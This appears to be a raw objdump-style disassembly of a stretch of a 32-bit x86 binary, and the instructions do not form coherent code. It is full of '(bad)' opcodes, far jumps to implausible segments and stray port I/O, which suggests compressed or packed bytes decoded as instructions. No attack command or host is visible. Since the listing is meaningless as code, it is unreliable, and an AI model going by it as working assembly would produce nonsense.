  422f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f5e:	add    BYTE PTR [edx],al
  422f60:	int3   
  422f61:	retf   0xa523
  422f64:	or     eax,0x443cdda0
  422f69:	mov    gs,WORD PTR [edi]
  422f6b:	mov    esp,0x52c2446a
  422f70:	mov    ebx,0x775f62b5
  422f75:	inc    ebx
  422f76:	sub    al,0x32
  422f78:	push   eax
  422f79:	shl    ecx,cl
  422f7b:	scas   al,BYTE PTR es:[edi]
  422f7c:	mov    al,ds:0xd8d5c6ed
  422f81:	lahf   
  422f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f83:	cmp    bl,dh
  422f85:	mov    ds:0xb714daa0,eax
  422f8a:	jge    0x422fa6
  422f8c:	and    BYTE PTR [ecx],ah
  422f8e:	and    bh,BYTE PTR [edx-0x35]
  422f91:	sbb    ecx,DWORD PTR [ebx]
  422f93:	lea    ebp,[eax-0x17]
  422f96:	xchg   ebx,eax
  422f97:	and    BYTE PTR [edx+0x52ef6cb2],dh
  422f9d:	sub    BYTE PTR [ebx],0x6e
  422fa0:	sub    al,0x84
  422fa2:	addr16 inc bx
  422fa5:	mov    edx,0x92c2ea00
  422faa:	std    
  422fab:	icebp  
  422fac:	fwait
  422fad:	cdq    
  422fae:	test   BYTE PTR [ebp-0xcdebfbe],ah
  422fb4:	inc    edx
  422fb5:	sti    
  422fb6:	mov    dh,0xd0
  422fb8:	inc    ecx
  422fb9:	aam    0x48
  422fbb:	popf   
  422fbc:	in     eax,dx
  422fbd:	push   es
  422fbe:	cmp    bl,bl
  422fc0:	cwde   
  422fc1:	movzx  eax,BYTE PTR [ebp+0x2386e3ed]
  422fc8:	mov    ebp,0xf76b0125
  422fcd:	pop    ecx
  422fce:	mov    ch,0x5b
  422fd0:	add    edx,eax
  422fd2:	push   eax
  422fd3:	dec    esi
  422fd4:	adc    esp,esp
  422fd6:	fwait
  422fd7:	sbb    eax,0xdc072fd6
  422fdc:	sbb    al,0x2c
  422fde:	shr    DWORD PTR [edi+0x11],1
  422fe1:	aam    0x8d
  422fe3:	fadd   DWORD PTR [edx-0x3e]
  422fe6:	mov    dh,0xd1
  422fe8:	push   edx
  422fe9:	xchg   edi,eax
  422fea:	mov    edi,0x2062013c
  422fef:	retf   
  422ff0:	sbb    edx,ebx
  422ff2:	lea    esp,[esi-0x17083d1e]
  422ff8:	loop   0x423066
  422ffa:	jl     0x422fe2
  422ffc:	push   ebx
  422ffd:	push   0x62db6b6b
  423002:	pushf  
  423003:	adc    DWORD PTR [ebp-0x3144d769],ecx
  423009:	mov    ch,BYTE PTR [esi]
  42300b:	sub    BYTE PTR [ebp+0xedaf458],0xa
  423012:	aam    0x2e
  423014:	xchg   ebp,eax
  423015:	popa   
  423016:	lds    esi,FWORD PTR [eax-0xf]
  423019:	cwde   
  42301a:	imul   esp,DWORD PTR [eax],0x58
  42301d:	pop    edx
  42301e:	fsub   DWORD PTR [ebx+ebx*1+0x6838e7bb]
  423025:	lea    ecx,[ebx]
  423027:	fcmovnbe st,st(6)
  423029:	jmp    0x422fed
  42302b:	pushf  
  42302c:	sbb    eax,0x47f340d9
  423031:	not    BYTE PTR [esp+ebx*8+0x4a]
  423035:	inc    ebp
  423036:	cmp    ebx,edi
  423038:	sbb    esi,DWORD PTR [ebp+0x76021b04]
  42303e:	mov    esp,0x515a0a0b
  423043:	repnz mov ah,0x6c
  423046:	ins    DWORD PTR es:[edi],dx
  423047:	jb     0x423089
  423049:	push   ebx
  42304a:	xchg   esi,eax
  42304b:	add    dl,dh
  42304d:	adc    edx,DWORD PTR [ebp+ebp*2-0x45]
  423051:	aam    0x11
  423053:	scas   al,BYTE PTR es:[edi]
  423054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423055:	push   ebx
  423056:	push   esi
  423057:	mov    esi,0x2dcea347
  42305c:	sub    eax,0xec0db46d
  423061:	mul    BYTE PTR ds:0x366be8a7
  423067:	test   eax,0x7ab0b535
  42306c:	fadd   DWORD PTR [edi]
  42306e:	fwait
  42306f:	add    edx,DWORD PTR [ebp+0x68]
  423072:	and    eax,DWORD PTR [ebx]
  423074:	shl    DWORD PTR [ebp+0x850b876],1
  42307a:	sub    ebp,0xffffffb6
  42307d:	pusha  
  42307e:	or     ecx,DWORD PTR [ebx]
  423080:	fild   DWORD PTR [edx+0x2a]
  423083:	push   edx
  423084:	mov    edx,0xcfd6f25c
  423089:	and    ch,BYTE PTR [ecx]
  42308b:	mov    edx,0x88b56e28
  423090:	pop    ss
  423091:	loop   0x4230f6
  423093:	mov    ds:0x8581dd79,al
  423098:	mov    dh,0xdd
  42309a:	xchg   BYTE PTR [edi],ah
  42309c:	sub    BYTE PTR [esi],bh
  42309e:	clc    
  42309f:	pop    ss
  4230a0:	call   0x76da:0x1616277b
  4230a7:	xchg   BYTE PTR [edx+0x431aacc5],dl
  4230ad:	dec    ebx
  4230ae:	cli    
  4230af:	sub    BYTE PTR [eax-0x55],0x1a
  4230b3:	xchg   edi,eax
  4230b4:	bound  edx,QWORD PTR [edx]
  4230b6:	mov    edx,0x36e3977b
  4230bb:	shr    BYTE PTR [ebp+0x2355d701],0x97
  4230c2:	jmp    0x5c10253d
  4230c7:	mov    ebx,0x298b142d
  4230cc:	imul   esi,DWORD PTR [edi+edx*4+0x72],0xffffffcb
  4230d1:	dec    ebp
  4230d2:	outs   dx,DWORD PTR ds:[esi]
  4230d3:	fdiv   QWORD PTR [esi+0x7180a006]
  4230d9:	mov    dl,0x23
  4230db:	mov    al,ds:0xc27d15d7
  4230e0:	push   esi
  4230e1:	test   al,0xb6
  4230e3:	fsubr  QWORD PTR [ebx-0x24]
  4230e6:	retf   
  4230e7:	cmp    BYTE PTR [edx],cl
  4230e9:	fcom   QWORD PTR [esi]
  4230eb:	sbb    al,al
  4230ed:	mov    ds:0xe08d0168,eax
  4230f2:	call   0x9a2d:0xadda9773
  4230f9:	dec    ebx
  4230fa:	imul   edx,DWORD PTR [ecx],0x5b
  4230fd:	ds jmp 0x75e1fac2
  423103:	adc    eax,0x7c4c0b6c
  423108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423109:	ret    
  42310a:	mov    ds:0xbb6d6da4,eax
  42310f:	mov    al,0xda
  423111:	int    0xdf
  423113:	imul   edi,DWORD PTR [ebp-0x10436a80],0x46dbb694
  42311d:	mov    ebx,0x209eb63e
  423122:	nop
  423123:	push   ds
  423124:	(bad)  
  423125:	sbb    al,0x24
  423127:	fwait
  423128:	dec    edi
  423129:	mov    ebx,0xf595b1b1
  42312e:	mov    ecx,0x965cccfb
  423133:	stc    
  423134:	stos   BYTE PTR es:[edi],al
  423135:	sbb    eax,0x602e041b
  42313a:	repz push ecx
  42313c:	test   eax,0xb6836b1b
  423141:	adc    BYTE PTR [edx],dl
  423143:	(bad)  
  423144:	sbb    ch,BYTE PTR [eax+edi*2]
  423147:	loop   0x42316b
  423149:	outs   dx,BYTE PTR ds:[esi]
  42314a:	dec    ebp
  42314b:	jo     0x4230ef
  42314d:	cmc    
  42314e:	ja     0x42317b
  423150:	aam    0x11
  423152:	inc    ecx
  423153:	or     DWORD PTR [eax+0x8],ebx
  423156:	sbb    dl,BYTE PTR [ecx]
  423158:	mov    bl,0x3b
  42315a:	add    BYTE PTR [eax+ecx*4],bl
  42315d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42315e:	jb     0x423101
  423160:	dec    ecx
  423161:	in     eax,0xd7
  423163:	leave  
  423164:	sbb    DWORD PTR [esi+0x65],0x2b
  423168:	adc    BYTE PTR [ecx+esi*8],dl
  42316b:	je     0x4231cf
  42316d:	sub    al,0x94
  42316f:	stos   BYTE PTR es:[edi],al
  423170:	test   edx,edx
  423172:	push   ds
  423173:	xchg   ebx,eax
  423174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423175:	cli    
  423176:	pop    eax
  423177:	fidivr WORD PTR [edx-0x29d24e50]
  42317d:	or     al,0xb9
  42317f:	cs dec esi
  423181:	(bad)  
  423182:	jmp    0x423138
  423184:	xchg   ecx,eax
  423185:	mov    dh,0x74
  423187:	imul   ecx,DWORD PTR [eax+0x2e892f66],0x31
  42318e:	cmc    
  42318f:	fucomip st,st(7)
  423191:	(bad)  
  423192:	out    0x6a,al
  423194:	mov    bh,0x53
  423196:	mov    al,0xb3
  423198:	jmp    0xf192d394
  42319d:	pop    eax
  42319e:	push   0x13edc45b
  4231a3:	cwde   
  4231a4:	cmc    
  4231a5:	(bad)  
  4231a6:	std    
  4231a7:	popa   
  4231a8:	arpl   bx,bx
  4231aa:	fcmovb st,st(6)
  4231ac:	scas   eax,DWORD PTR es:[edi]
  4231ad:	jmp    0x4231f7
  4231af:	xchg   edx,eax
  4231b0:	xor    cl,BYTE PTR [ebp+0x575bafd2]
  4231b6:	lds    esi,FWORD PTR [esi-0x8]
  4231b9:	dec    esi
  4231ba:	imul   edx,DWORD PTR ds:0x80ceac24,0x6e
  4231c1:	sub    al,0xc4
  4231c3:	sbb    DWORD PTR [ecx+0x6f],0xa078cfde
  4231ca:	mov    ebx,0xaeda176
  4231cf:	pop    ss
  4231d0:	sbb    al,0x8f
  4231d2:	dec    edx
  4231d3:	jo     0x4231ba
  4231d5:	rcl    esp,1
  4231d7:	xor    BYTE PTR [eax],dl
  4231d9:	fdiv   QWORD PTR [esi+0x4e297e11]
  4231df:	ins    DWORD PTR es:[edi],dx
  4231e0:	pop    edi
  4231e1:	jne    0x42324e
  4231e3:	mov    bh,0x85
  4231e5:	push   ecx
  4231e6:	mov    al,0x5c
  4231e8:	fsubr  st(4),st
  4231ea:	push   0xed11ad83
  4231ef:	mov    dh,0x35
  4231f1:	mov    al,ds:0xb00287f4
  4231f6:	gs into 
  4231f8:	out    0xd4,al
  4231fa:	dec    edx
  4231fb:	cs xchg esi,eax
  4231fd:	mov    dh,0x2a
  4231ff:	(bad)
  423203:	fadd   QWORD PTR [ebp+ebp*4+0x2b]
  423207:	xchg   esi,eax
  423208:	or     BYTE PTR [edi+esi*1],cl
  42320b:	cmp    edi,0xd85b6d4a
  423211:	(bad)  
  423213:	loopne 0x4231cb
  423215:	repnz div DWORD PTR [edx*2-0x3958bbbc]
  42321d:	(bad)  
  42321e:	(bad)  
  42321f:	mov    bh,BYTE PTR [esi+0x39]
  423222:	sub    al,0x31
  423224:	ss pop es
  423226:	sbb    BYTE PTR [ebx],bl
  423228:	or     ebx,ebx
  42322a:	(bad)  
  42322b:	mov    bh,BYTE PTR [edi+0x61]
  42322e:	xlat   BYTE PTR ds:[ebx]
  42322f:	adc    DWORD PTR [ebp-0x76c7c091],esi
  423235:	pusha  
  423236:	fld    TBYTE PTR [esi+0x53]
  423239:	scas   eax,DWORD PTR es:[edi]
  42323a:	int    0x3e
  42323c:	jmp    0xc6abe4af
  423241:	repnz lea ebp,[ebp+0x984e6b7]
  423248:	xor    eax,0xa4da003c
  42324d:	and    DWORD PTR [ebp+0x0],ebp
  423250:	outs   dx,BYTE PTR ds:[esi]
  423251:	fistp  DWORD PTR [ecx+ebp*8+0x46ac50ea]
  423258:	fdivr  DWORD PTR [esi+0x6b701773]
  42325e:	test   eax,0x911b988c
  423263:	mov    dl,0x95
  423265:	mov    ah,0x1a
  423267:	mov    ds:0x92506db6,al
  42326c:	out    dx,eax
  42326d:	mov    ah,0x35
  42326f:	out    0x8a,al
  423271:	arpl   WORD PTR [edi-0x12d25c93],si
  423277:	gs std 
  423279:	cwde   
  42327a:	cmp    ecx,DWORD PTR [esi-0x2f8619dd]
  423280:	(bad)  
  423281:	cmp    ch,BYTE PTR [edx-0x3b]
  423284:	jns    0x42326b
  423286:	pop    ds
  423287:	xor    cl,BYTE PTR [eax-0x73]
  42328a:	mov    dh,0x75
  42328c:	adc    al,dl
  42328e:	aaa    
  42328f:	in     al,dx
  423290:	mov    ebx,0x5476fec2
  423295:	mov    bh,0x4a
  423297:	sub    al,0xfd
  423299:	and    al,0xe3
  42329b:	cli    
  42329c:	inc    esi
  42329d:	or     ch,bh
  42329f:	inc    edx
  4232a0:	in     eax,dx
  4232a1:	(bad)  
  4232a2:	rol    DWORD PTR ds:0xc8239634,1
  4232a8:	mov    bl,dh
  4232aa:	pop    esp
  4232ab:	loopne 0x42329f
  4232ad:	lods   eax,DWORD PTR ds:[esi]
  4232ae:	test   edx,ebp
  4232b0:	sub    esi,ebx
  4232b2:	icebp  
  4232b3:	adc    al,0x72
  4232b5:	add    BYTE PTR [esi+ebx*1-0x49e9a2b8],dl
  4232bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232bd:	faddp  st(1),st
  4232bf:	sub    al,0x3a
  4232c1:	cs pusha 
  4232c3:	arpl   WORD PTR [esi+edx*1],di
  4232c6:	fisub  DWORD PTR [esi]
  4232c8:	add    esi,DWORD PTR [ebx+0x50dbca9e]
  4232ce:	xor    al,0x1a
  4232d0:	popa   
  4232d1:	arpl   bx,bx
  4232d3:	push   ss
  4232d4:	addr16 jge 0x42330c
  4232d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232d8:	sbb    eax,0xf4a9cfa0
  4232dd:	mov    dh,0x54
  4232df:	mov    esi,0xd1d6f674
  4232e4:	or     BYTE PTR [eax],al
  4232e6:	jo     0x4232a3
  4232e8:	dec    BYTE PTR [eax]
  4232ea:	mov    al,0xb6
  4232ec:	push   cs
  4232ed:	jmp    0xc2d1:0xc20da9c2
  4232f4:	jns    0x4232d9
  4232f6:	mov    ds:0x3605a5da,eax
  4232fb:	ss jb  0x4232dc
  4232fe:	ins    DWORD PTR es:[edi],dx
  4232ff:	mov    WORD PTR [esi-0x3],?
  423302:	sahf   
  423303:	adc    al,0xa8
  423305:	lods   eax,DWORD PTR ds:[esi]
  423306:	fstp   QWORD PTR [edi-0x65]
  423309:	je     0x4232b8
  42330b:	xchg   edx,eax
  42330c:	mov    esp,DWORD PTR [ecx]
  42330e:	(bad)  
  423310:	sbb    BYTE PTR [ebx],0xb6
  423313:	(bad)  
  423314:	mov    ebp,0xb0e45048
  423319:	inc    eax
  42331a:	jo     0x4232c5
  42331c:	fld    QWORD PTR [ecx]
  42331e:	pop    edx
  42331f:	dec    edx
  423320:	ret    0xc898
  423323:	sub    al,0x60
  423325:	loope  0x4232fd
  423327:	(bad)  
  423328:	loopne 0x4232b9
  42332a:	cmc    
  42332b:	xor    al,0xdc
  42332d:	call   0xb404:0xdb694077
  423334:	mov    ds:0x60a12aba,eax
  423339:	(bad)  [ebp+ebp*4+0x56dbb6da]
  423340:	adc    BYTE PTR [ebp+ebx*1-0x30],dl
  423344:	icebp  
  423345:	push   eax
  423346:	test   al,0xc5
  423348:	enter  0xd2d5,0x56
  42334c:	pop    eax
  42334d:	jmp    0x85ceb569
  423352:	add    eax,0xc05d0bf0
  423357:	inc    esi
  423358:	add    DWORD PTR [edx-0x7ddd428],0x6c6ed6c2
  423362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423363:	dec    edi
  423364:	inc    eax
  423365:	(bad)  
  423366:	xchg   ecx,eax
  423367:	inc    edi
  423368:	cmp    BYTE PTR [esp+esi*1-0x55],bl
  42336c:	or     ebp,edx
  42336e:	rol    BYTE PTR [ecx+0x20],cl
  423371:	ror    DWORD PTR [edx],1
  423373:	popf   
  423374:	jmp    0x42334f
  423376:	jbe    0x423319
  423378:	jo     0x4233dd
  42337a:	adc    BYTE PTR [edi-0x29],ch
  42337d:	add    DWORD PTR [eax-0x60],0x8dad2268
  423384:	jbe    0x423387
  423386:	shr    esi,0xa4
  423389:	scas   eax,DWORD PTR es:[edi]
  42338a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42338b:	fsubr  QWORD PTR ds:0x416e346c
  423391:	xlat   BYTE PTR ds:[ebx]
  423392:	pusha  
  423393:	xchg   DWORD PTR [esi+0x4c],ecx
  423396:	test   eax,0xb80bb642
  42339b:	mov    ch,0x12
  42339d:	inc    edi
  42339e:	inc    eax
  42339f:	mov    ebp,0xfedbd5cb
  4233a4:	adc    al,0x4f
  4233a6:	ins    DWORD PTR es:[edi],dx
  4233a7:	sbb    esi,DWORD PTR [edi-0x3cd4813e]
  4233ad:	and    eax,0xa9b456b6
  4233b2:	ins    BYTE PTR es:[edi],dx
  4233b3:	adc    al,0x6e
  4233b5:	or     ebx,DWORD PTR [ebp+0x1bfc32dd]
  4233bb:	jg     0x423350
  4233bd:	mov    bl,0xda
  4233bf:	lea    eax,[esi]
  4233c1:	ins    DWORD PTR es:[edi],dx
  4233c2:	mov    ebp,0x145746ae
  4233c7:	jl     0x423440
  4233c9:	retf   0x75bf
  4233cc:	fild   DWORD PTR [ebp+edx*8+0x2f]
  4233d0:	xchg   edx,eax
  4233d1:	ins    BYTE PTR es:[edi],dx
  4233d2:	in     eax,0x2b
  4233d4:	add    dh,bl
  4233d6:	dec    esp
  4233d7:	add    BYTE PTR [ebp+0x67],bh
  4233da:	sub    eax,0x43162d97
  4233df:	in     eax,dx
  4233e0:	int3   
  4233e1:	pop    ss
  4233e2:	push   edi
  4233e3:	jne    0x423395
  4233e5:	push   ebx
  4233e6:	les    ebp,FWORD PTR [ebp-0x55]
  4233e9:	into   
  4233ea:	add    esi,esp
  4233ec:	inc    ecx
  4233ed:	inc    ebx
  4233ee:	adc    eax,0xdd003603
  4233f3:	and    BYTE PTR [ebp-0x70e8e30a],dh
  4233f9:	xchg   DWORD PTR [esi],edi
  4233fb:	je     0x4233c6
  4233fd:	aad    0xb3
  4233ff:	cs in  al,dx
  423401:	aas    
  423402:	stos   DWORD PTR es:[edi],eax
  423403:	mov    edi,0xe0a6e723
  423408:	rcl    dh,cl
  42340a:	mov    eax,ds:0xb4d4081d
  42340f:	push   ds
  423410:	sub    eax,0x8176d05d
  423415:	ret    
  423416:	and    al,0x87
  423418:	jns    0x423428
  42341a:	ret    0x45d1
  42341d:	xchg   esi,eax
  42341e:	outs   dx,BYTE PTR ds:[esi]
  42341f:	ins    DWORD PTR es:[edi],dx
  423420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423421:	(bad)  [ebx]
  423423:	cmp    edi,DWORD PTR [ecx+0x2b]
  423426:	stos   DWORD PTR es:[edi],eax
  423427:	cdq    
  423428:	cmp    cl,0x2b
  42342b:	mov    edi,0x6492d0b5
  423430:	jnp    0x4233f0
  423432:	pop    esi
  423433:	addr16 add bl,cl
  423436:	inc    ebp
  423437:	mov    eax,ds:0x768585da
  42343c:	mov    edi,0xd0012088
  423441:	push   ebp
  423442:	jg     0x423468
  423444:	mov    ecx,0x16db7685
  423449:	out    dx,al
  42344a:	push   ecx
  42344b:	outs   dx,BYTE PTR ds:[esi]
  42344c:	call   0xf2a7fd59
  423451:	test   eax,0xd04341cb
  423456:	iret   
  423457:	mov    ebx,0x4cfb9258
  42345c:	lods   eax,DWORD PTR ds:[esi]
  42345d:	jbe    0x4234ca
  42345f:	popa   
  423460:	repnz dec esp
  423462:	xor    DWORD PTR [ecx],ebx
  423464:	fs fwait
  423466:	outs   dx,BYTE PTR ds:[esi]
  423467:	in     eax,0x4d
  423469:	rol    DWORD PTR [ebp+0x43c655d6],1
  42346f:	hlt    
  423470:	lds    esp,FWORD PTR [eax+edi*1+0x70]
  423474:	push   esi
  423475:	push   0x99f24b6c
  42347a:	sub    al,0xea
  42347c:	cmp    DWORD PTR [edi],0xa5896d23
  423482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423483:	sbb    eax,0x2e05a475
  423488:	loop   0x42348f
  42348a:	std    
  42348b:	jmp    0x1ffd:0x62e0a5d3
  423492:	clc    
  423493:	xchg   edi,eax
  423494:	ja     0x4234d1
  423496:	out    0xa4,eax
  423498:	fst    QWORD PTR [esi-0x14465e81]
  42349e:	dec    edx
  42349f:	into   
  4234a0:	add    BYTE PTR [edi+0x35],bh
  4234a3:	add    BYTE PTR [edi],cl
  4234a5:	nop
  4234a6:	push   0xb694c1d
  4234ab:	rcl    BYTE PTR [ecx],0x12
  4234ae:	fsub   QWORD PTR [ecx]
  4234b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234b1:	pop    edx
  4234b2:	push   ebx
  4234b3:	mov    ds:0x836a4068,eax
  4234b8:	pushf  
  4234b9:	outs   dx,BYTE PTR ds:[esi]
  4234ba:	pop    eax
  4234bb:	sub    BYTE PTR [edi+esi*4-0x69],ch
  4234bf:	inc    edi
  4234c0:	push   ss
  4234c1:	sub    DWORD PTR [ecx],ecx
  4234c3:	test   eax,0xd8d82d5e
  4234c8:	push   ss
  4234c9:	pop    eax
  4234ca:	jae    0x42345d
  4234cc:	lock out dx,al
  4234ce:	mov    eax,ds:0xb1f90f7b
  4234d3:	mov    ah,0x2d
  4234d5:	mov    ecx,0xe6441d60
  4234da:	push   edx
  4234db:	or     DWORD PTR [ebx+ebx*8+0x441a96d8],0xffffffd7
  4234e3:	hlt    
  4234e4:	sub    DWORD PTR [ebx],0xffffffb1
  4234e7:	push   ebx
  4234e8:	push   esi
  4234e9:	adc    edx,esp
  4234eb:	ins    DWORD PTR es:[edi],dx
  4234ec:	popa   
  4234ed:	xlat   BYTE PTR ds:[ebx]
  4234ee:	call   0xd44e29ff
  4234f3:	(bad)  
  4234f4:	mov    al,ds:0x2e42c2ed
  4234f9:	pop    edi
  4234fa:	pop    ebp
  4234fb:	scas   eax,DWORD PTR es:[edi]
  4234fc:	mov    eax,ds:0xb67905fe
  423501:	push   ss
  423502:	push   ss
  423503:	call   0x5c7c:0xad1f7db1
  42350a:	inc    eax
  42350b:	lods   al,BYTE PTR ds:[esi]
  42350c:	je     0x423571
  42350e:	fist   DWORD PTR [esi]
  423510:	mov    ds:0x6883c8be,eax
  423515:	jg     0x4234aa
  423517:	or     BYTE PTR [edi],cl
  423519:	fiadd  DWORD PTR [esi-0x10d2b8a0]
  42351f:	push   cs
  423520:	into   
  423521:	test   BYTE PTR [eax-0x249c9cf5],bl
  423527:	ss xchg ebx,eax
  423529:	pusha  
  42352a:	push   ebx
  42352b:	jbe    0x423538
  42352d:	into   
  42352e:	shl    BYTE PTR [ebx+0x51c8895d],0x71
  423535:	lahf   
  423536:	fiadd  WORD PTR [ecx-0x69]
  423539:	fstp   st(2)
  42353b:	lods   eax,DWORD PTR ds:[esi]
  42353c:	jbe    0x423572
  42353e:	jmp    0x423542
  423540:	push   ebp
  423541:	mov    edi,DWORD PTR [edi+0x1d]
  423544:	push   cs
  423545:	sub    ecx,DWORD PTR [ebx]
  423547:	pop    esp
  423548:	fdiv   DWORD PTR [esi-0x1a6ad953]
  42354e:	dec    edx
  42354f:	xchg   edi,eax
  423550:	mov    bl,0xf3
  423552:	jmp    0x42358c
  423554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423555:	(bad)  
  423556:	push   ebp
  423557:	sub    al,0xb
  423559:	adc    dl,BYTE PTR [ecx]
  42355b:	in     al,dx
  42355c:	inc    ebp
  42355d:	add    edi,ebx
  42355f:	or     eax,0x59ea0ec5
  423564:	push   0xf36c2e0e
  423569:	inc    esp
  42356a:	lods   eax,DWORD PTR ds:[esi]
  42356b:	test   al,0x40
  42356d:	dec    ebx
  42356e:	es xchg ebx,eax
  423570:	or     edi,DWORD PTR [edx]
  423572:	or     edi,DWORD PTR [ebx]
  423574:	mov    ch,BYTE PTR [esi+0x41]
  423577:	out    dx,al
  423578:	xchg   BYTE PTR [ebp-0x57ef7c9a],bl
  42357e:	sub    ch,0xc2
  423581:	push   ebx
  423582:	add    edx,DWORD PTR [esi]
  423584:	sbb    al,0x8e
  423586:	loope  0x42358a
  423588:	gs ins BYTE PTR es:[edi],dx
  42358a:	pop    esp
  42358b:	pusha  
  42358c:	imul   esi,DWORD PTR ds:0x18aafe67,0xffffffe3
  423593:	aad    0x27
  423595:	enter  0x9615,0x36
  423599:	adc    bl,bh
  42359b:	push   es
  42359c:	les    edi,FWORD PTR [esi]
  42359e:	clc    
  42359f:	jo     0x42360d
  4235a1:	cmp    BYTE PTR [eax-0x423cca4f],0x6b
  4235a8:	or     BYTE PTR [esi+ebx*1],cl
  4235ab:	add    esi,DWORD PTR [edi-0x3bd48f4a]
  4235b1:	mov    eax,ds:0xcdf738ed
  4235b6:	(bad)  
  4235b7:	aam    0xa8
  4235b9:	and    dl,al
  4235bb:	push   ecx
  4235bc:	pop    ss
  4235bd:	push   0x54fa0002
  4235c2:	leave  
  4235c3:	sbb    eax,0xb0bbf513
  4235c8:	adc    ecx,DWORD PTR [esi+ebp*1+0x5d837312]
  4235cf:	and    al,0xa3
  4235d1:	or     ebx,DWORD PTR [ebx]
  4235d3:	mov    ah,0x5b
  4235d5:	sub    edi,0x8ca49a80
  4235db:	push   0xa
  4235dd:	scas   al,BYTE PTR es:[edi]
  4235de:	cmp    ah,BYTE PTR [edx-0x2f499392]
  4235e4:	mov    bh,BYTE PTR [esi+0x28]
  4235e7:	ja     0x4235f0
  4235e9:	ins    DWORD PTR es:[edi],dx
  4235ea:	stos   DWORD PTR es:[edi],eax
  4235eb:	fidiv  DWORD PTR [esi]
  4235ed:	inc    ebp
  4235ee:	pop    ss
  4235ef:	ret    0xecdb
  4235f2:	push   ebx
  4235f3:	adc    DWORD PTR [ebp+0x2a56d0b],esi
  4235f9:	cmp    BYTE PTR [eax-0x7f],dl
  4235fc:	xor    ah,BYTE PTR [edi-0x49598b54]
  423602:	test   eax,0xddc505b8
  423607:	inc    ebx
  423608:	pop    eax
  423609:	cmp    al,0x5
  42360b:	outs   dx,BYTE PTR ds:[esi]
  42360d:	ins    BYTE PTR es:[edi],dx
  42360e:	mov    ah,0x85
  423610:	sahf   
  423611:	and    eax,0xbb963edc
  423616:	push   ds
  423617:	cmp    ebx,DWORD PTR [eax+ebx*8]
  42361a:	xchg   esi,eax
  42361b:	mov    edx,0xe460aa80
  423620:	aam    0xa4
  423622:	or     bl,bl
  423624:	add    DWORD PTR [ebp-0x25],esi
  423627:	adc    eax,0x3a05503a
  42362c:	data16 data16 cs mov bl,0x11
  423631:	fild   DWORD PTR [esi]
  423633:	pusha  
  423634:	dec    ecx
  423635:	or     DWORD PTR [eax],ebp
  423637:	icebp  
  423638:	repnz fnsave ds:0xfd75b836
  42363f:	or     BYTE PTR [ebx+ebx*1],dl
  423642:	xlat   BYTE PTR ds:[ebx]
  423643:	rcl    DWORD PTR [edi-0x1a92d200],1
  423649:	mov    edi,0xde6e3b
  42364e:	daa    
  42364f:	ret    0x1c00
  423652:	enter  0xdec,0x4a
  423656:	cmp    ch,dl
  423658:	mov    al,0xd0
  42365a:	and    BYTE PTR fs:[edx],cl
  42365d:	add    bh,ch
  42365f:	jae    0x423638
  423661:	pop    ebx
  423662:	mov    eax,0xd17cb5b0
  423667:	push   ebp
  423668:	mov    cl,0xd0
  42366a:	cmp    al,0xbf
  42366c:	pop    esi
  42366d:	shl    DWORD PTR [esi+0x550a36d8],cl
  423673:	dec    ebp
  423674:	test   dh,0x80
  423677:	sub    esi,DWORD PTR [ecx-0x31d5af4f]
  42367d:	dec    edi
  42367e:	and    cl,BYTE PTR [esi+0x59]
  423681:	ret    0x5aae
  423684:	mov    edx,0x95274296
  423689:	jo     0x423613
  42368b:	jno    0x4236fb
  42368d:	call   0x85e7c0e2
  423692:	push   edx
  423693:	sahf   
  423694:	pop    edi
  423695:	add    DWORD PTR [edx+edx*1-0x4f],esp
  423699:	mov    cl,0xb0
  42369b:	(bad)  
  42369c:	push   ecx
  42369d:	mov    ch,0xf3
  42369f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236a0:	bound  ecx,QWORD PTR [eax]
  4236a2:	and    dh,BYTE PTR [esi+0x15488dc2]
  4236a8:	mov    esp,0xb6dfbf1c
  4236ad:	inc    eax
  4236ae:	sub    al,0xb4
  4236b0:	repnz cmp dh,BYTE PTR [edx]
  4236b3:	xchg   ecx,eax
  4236b4:	mov    eax,ds:0x6daddb11
  4236b9:	mov    bh,0x5f
  4236bb:	cmp    cl,bl
  4236bd:	mov    al,0xe6
  4236bf:	xor    bh,BYTE PTR [edi+0x6cf8556d]
  4236c5:	cs ins DWORD PTR es:[edi],dx
  4236c7:	pop    ebp
  4236c8:	adc    al,0xc1
  4236ca:	adc    al,0xf5
  4236cc:	mov    WORD PTR [ebp-0x2a],?
  4236cf:	mov    esi,0xd0b544ad
  4236d4:	mov    al,0x55
  4236d6:	push   edx
  4236d7:	mov    ah,0xe3
  4236d9:	ins    DWORD PTR es:[edi],dx
  4236da:	mov    eax,ds:0xaf90da96
  4236df:	sub    DWORD PTR [edx+0x43],esp
  4236e2:	inc    eax
  4236e3:	jle    0x423677
  4236e5:	adc    ch,BYTE PTR [ebx+ecx*2+0x1b]
  4236e9:	mov    edx,0xadcf830c
  4236ee:	push   0x41
  4236f0:	fcmovnu st,st(0)
  4236f2:	mov    dh,0xc2
  4236f4:	retf   0x8f82
  4236f7:	loop   0x42375b
  4236f9:	and    eax,0xdb865a48
  4236fe:	(bad)  
  4236ff:	push   esp
  423700:	jno    0x42375a
  423702:	icebp  
  423703:	mov    fs:0x26ce8d5c,eax
  423709:	aad    0xb8
  42370b:	mov    al,0xb5
  42370d:	(bad)  
  423710:	es dec edi
  423712:	jne    0x423756
  423714:	fsubr  DWORD PTR [ebp-0x57]
  423717:	inc    ecx
  423718:	mov    ah,0x58
  42371a:	rcr    ch,0x2f
  42371d:	test   al,0x8f
  42371f:	das    
  423720:	mov    al,0x6d
  423722:	fndisi(8087 only) 
  423724:	outs   dx,DWORD PTR ds:[esi]
  423725:	mov    eax,ds:0x141d7a29
  42372a:	push   ss
  42372b:	or     al,0xb4
  42372d:	add    BYTE PTR [ecx+0x2a],al
  423730:	push   ss
